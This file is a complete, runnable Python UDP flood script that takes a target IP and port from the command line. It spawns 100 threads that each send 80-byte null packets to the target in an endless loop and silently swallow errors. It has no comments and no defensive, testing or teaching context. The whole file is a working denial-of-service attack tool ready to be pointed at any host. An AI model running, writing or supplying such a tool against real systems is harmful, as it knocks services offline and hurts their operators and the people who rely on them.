import socket
import sys
import time
import threading

def attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x00" * 80 
    
    while True:
        try:
            sock.sendto(payload, (ip, port))
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit()

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    for _ in range(100):
        t = threading.Thread(target=attack, args=(target_ip, target_port))
        t.daemon = True
        t.start()
    
    while True:
        time.sleep(10)
